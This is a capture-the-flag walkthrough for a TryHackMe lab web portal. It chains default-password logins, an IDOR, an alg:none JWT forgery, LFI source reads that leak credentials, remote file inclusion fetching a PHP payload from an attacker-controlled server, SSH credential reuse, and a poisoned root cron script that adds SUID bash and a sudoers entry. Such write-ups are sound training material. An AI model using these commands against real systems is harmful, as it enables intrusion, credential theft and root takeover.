@@ -1,0 +1,277 @@
+========================================================================
+        NexusCorp Portal — Full Walkthrough (THM)
+        "Watch the system fall, one domino at a time."
+========================================================================
+
+Machine IP : 10.48.132.72
+Services   : 22/tcp (SSH)  80/tcp (Apache 2.4.58)
+
+Flags found in order:
+  1. THM{1d0r_h0r1z0nt4l_fl4g1}      IDOR / Horizontal privilege escalation
+  2. THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}  Admin panel (JWT alg:none + LFI)
+  3. THM{rf1_2_rc3_f00th0ld_fl4g3}   RFI -> RCE foothold (/opt/flag3.txt)
+  4. THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}  devops SSH cred reuse (user.txt)
+  5. THM{pr1v3sc_cr0n_r00t_fl4g5}     Writable cron script -> root (root.txt)
+
+-----------------------------------------------------------------------
+STAGE 0 — RECON
+-----------------------------------------------------------------------
+
+    nmap -Pn -sV -O -sC -T4 10.48.132.72
+
+    22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+    80/tcp open  http    Apache httpd 2.4.58 (Ubuntu) "NexusCorp Portal"
+
+Browsing to http://10.48.132.72/ shows an employee login portal
+("NexusCorp Portal") with a Forgot Password link and an /team.php page.
+
+The team page gives us the full roster -> usernames are firstname.lastname:
+
+    laura.hayes    (CIO)          michael.chen   (Lead Security Eng)
+    sarah.johnson  (SW Engineer)  robert.wilson  (DevOps Engineer)
+    emma.taylor    (PM)           david.brown    (Full Stack Dev)
+    james.wright   (Sys Admin)
+
+-----------------------------------------------------------------------
+STAGE 1 — DIRECTORY ENUMERATION
+-----------------------------------------------------------------------
+
+    gobuster dir -u http://10.48.132.72 \
+        -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50
+
+Results of interest:
+    /admin/            (301)
+    /api/              (301)
+    /backup/           (301)
+    /support/          (301)
+    auth.php           (200, empty)
+    config.php         (200, empty)
+    dashboard.php      (302 -> /index.php)
+    forgot.php         (200)
+
+Nested enumeration:
+
+    gobuster dir -u http://10.48.132.72/api/  -w dirb/common.txt -x php,json,txt
+    gobuster dir -u http://10.48.132.72/backup/ ...
+
+API directory listing (/api/) reveals index.php (200), login.php (405),
+files.php (401), and subdirs /api/auth/ (token.php) and /api/users/
+(profile.php).
+
+/backup/ contains:
+    README.txt  -> "config.enc - Encrypted application configuration
+                    (AES-128-ECB). Decryption key reference: see
+                    static/app.js (deployment notes)"
+    config.enc  -> encrypted blob
+
+-----------------------------------------------------------------------
+STAGE 2 — LOGIN & PASSWORD REUSE
+-----------------------------------------------------------------------
+
+A single POST to index.php with any team username and password "password"
+succeeds (302 redirect). Confirmed valid accounts, e.g.:
+
+    robert.wilson : password
+
+    curl -c cookies.txt -X POST http://10.48.132.72/index.php \
+        -d "username=robert.wilson&password=password"
+
+The session cookie "nexus_session" is base64(JSON payload).hmac-sha256:
+
+    eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6InJvYmVydC53aWxzb24iLCJyb2xlIjoidXNlciJ9
+    .06633788837d4525fc57614def8718cf061a8374b95120eb93aedfd74eb4cee3
+
+Decoded payload:
+    {"user_id":4,"username":"robert.wilson","role":"user"}
+
+Dashboard confirms the file API and a profile API:
+    GET /api/files.php?name=   (requires JWT)
+    GET /api/users/profile.php?id=4
+
+-----------------------------------------------------------------------
+STAGE 3 — FLAG 1 : IDOR (Horizontal Priv-Esc)
+-----------------------------------------------------------------------
+
+    curl -s -b cookies.txt "http://10.48.132.72/api/users/profile.php?id=1"
+    curl -s -b cookies.txt "http://10.48.132.72/api/users/profile.php?id=2"
+
+The profile endpoint never checks that you own the requested id -> IDOR.
+
+    {"id":1,"username":"laura.hayes",...,"role":"admin",
+     "notes":"THM{1d0r_h0r1z0nt4l_fl4g1}"}
+
+    FLAG 1 = THM{1d0r_h0r1z0nt4l_fl4g1}
+    Bonus info: laura.hayes (id=1) is the only admin.
+
+-----------------------------------------------------------------------
+STAGE 4 — JWT + LFI (Admin Panel)
+-----------------------------------------------------------------------
+
+The file API needs a JWT. token.php issues one from your session, but it
+always carries role=user. files.php rejects non-admin tokens:
+
+    curl -s -b cookies.txt http://10.48.132.72/api/auth/token.php
+    -> {"token":"<HS256 JWT>", ...}
+
+Attempts to crack the JWT secret (rockyou, wordlists) fail.
+
+KEY FINDING — app.js hardcodes the encryption key for config.enc:
+
+    curl -s http://10.48.132.72/static/app.js
+
+    // Key: N3xusK3y2024!!  (pad to 16 bytes with )
+    _backupKey: 'N3xusK3y2024!!'
+
+Decrypt the backup config (AES-128-ECB, key = "N3xusK3y2024!!\x00\x00"):
+
+    openssl enc -d -aes-128-ecb \
+        -K 4e337875734b33793230323421210000 -in config.enc
+
+    {"app_name":"NexusCorp Portal","version":"2.3.1",
+     "deploy_env":"production","system_user":"devops"}
+
+system_user: devops — a username hint for SSH later.
+
+ADMIN JWT VIA ALGORITHM CONFUSION (alg:none):
+
+The JWT verifier does not enforce algorithm == HS256. Forge a token with
+alg "none" and role "admin":
+
+    H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+    P=$(echo -n '{"sub":"laura.hayes","role":"admin","iat":1786130000,"exp":1786139000}' \
+        | base64 -w0 | tr '+/' '-_' | tr -d '=')
+    A="$H.$P."
+
+Test:
+    curl -s -H "Authorization: Bearer $A" \
+        "http://10.48.132.72/api/files.php?name=/etc/passwd"
+    -> {"error":"Access denied: path must be within /var/www/html/"}
+
+(Error changed from "Admin JWT required" -> path check => the forged
+admin token is ACCEPTED.)
+
+LFI — read application source through files.php (path resolves relative
+to /var/www/html/api/):
+
+    curl -s -H "Authorization: Bearer $A" "http://10.48.132.72/api/files.php?name=../config.php"
+    curl -s -H "Authorization: Bearer $A" "http://10.48.132.72/api/files.php?name=../api/files.php"
+    curl -s -H "Authorization: Bearer $A" "http://10.48.132.72/api/files.php?name=../admin/index.php"
+
+Harvested from source:
+
+    DB creds   : app_user : D3v0ps!2024  (nexusdb)
+    JWT_SECRET : nexus_jwt_s3cr3t_2024
+    APP_SECRET : nexus_app_k3y_2024
+    FLAG2      : admin/index.php  ->  THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
+
+Admin panel access with the forged token:
+
+    curl -s -H "Authorization: Bearer $A" "http://10.48.132.72/admin/"
+
+    FLAG 2 = THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
+
+-----------------------------------------------------------------------
+STAGE 5 — FLAG 3 : RFI -> RCE (Foothold)
+-----------------------------------------------------------------------
+
+files.php source shows a backdoor: any "name" starting with http:// or
+https:// is fetched with file_get_contents() and the result is eval()'d:
+
+    if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
+        $remote = @file_get_contents($name);
+        ...
+        eval(str_replace("<?php", "", $remote));
+        ...
+    }
+
+Host a PHP payload (returns the flag) somewhere the box can reach, e.g.
+a public raw file / paste service:
+
+    <?php system('cat /opt/flag3.txt'); ?>
+
+Trigger it:
+
+    curl -s -H "Authorization: Bearer $A" \
+        "http://10.48.132.72/api/files.php?name=http://<your_server>/shell.txt"
+
+    FLAG 3 = THM{rf1_2_rc3_f00th0ld_fl4g3}   (/opt/flag3.txt)
+
+-----------------------------------------------------------------------
+STAGE 6 — FLAG 4 : SSH / devops
+-----------------------------------------------------------------------
+
+The decrypted config leaked the system user "devops". Try SSH with the
+DB password (password reuse):
+
+    ssh devops@10.48.132.72
+    Password: D3v0ps!2024
+
+    devops@tryhackme-2404:~$ ls
+    user.txt
+    devops@tryhackme-2404:~$ cat user.txt
+    THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
+
+    FLAG 4 = THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
+
+-----------------------------------------------------------------------
+STAGE 7 — FLAG 5 : Privesc to ROOT
+-----------------------------------------------------------------------
+
+Enumeration on the box:
+
+    sudo -l                 -> not permitted
+    ls -la /opt
+    find / -type f -writable 2>/dev/null
+
+Two root-owned, world/group-writable files stand out:
+
+    -rwxrwxrwx 1 root root    /opt/admin_bot.py          (runs as root, PID 1115)
+    -rwxrwxr-- 1 root devops  /opt/monitoring/health_report.sh
+
+The box ships pspy64 in /opt/tools — copy it out and run it:
+
+    cp /opt/tools/pspy64 ~/pspy64 && chmod +x ~/pspy64 && ./pspy64
+
+pspy shows the cron trigger:
+
+    20:10:01 /usr/sbin/CRON ... /bin/sh -c /opt/monitoring/health_report.sh
+    20:11:01 ... same, every minute, UID=0
+
+So /opt/monitoring/health_report.sh is executed as ROOT once a minute,
+and it is writable by the devops group. Poison it:
+
+    cat > /opt/monitoring/health_report.sh <<'EOF'
+    #!/bin/bash
+    chmod 4755 /bin/bash
+    echo "devops ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+    EOF
+
+(No chmod needed — group already has w/x.)
+
+Wait ~60s for the next cron tick, then either:
+
+    bash -p                      # SUID /bin/bash -> root shell
+
+    # or
+    sudo -i                      # NOPASSWD sudoers entry
+
+    id
+    root
+
+    cat /root/root.txt
+    FLAG 5 = THM{pr1v3sc_cr0n_r00t_fl4g5}
+
+========================================================================
+SUMMARY OF VULNERABILITIES (the domino chain)
+========================================================================
+
+ 1. Information disclosure / misconfig  : world-writable backups,
+    index listings, config.enc exposed, hardcoded keys in JS.
+ 2. Weak default password               : "password" for several accounts.
+ 3. Broken access control (IDOR)        : profile.php?id=1  -> FLAG1.
+ 4. JWT algorithm confusion (alg:none)  : forge admin JWT.
+ 5. Path traversal / LFI                : files.php read app source.
+ 6. Remote File Inclusion -> RCE        : eval(http://...) -> FLAG3.
+ 7. Credential reuse                    : D3v0ps!2024 on SSH -> FLAG4.
+ 8. Writable cron script                : health_report.sh as root -> FLAG5.
+========================================================================
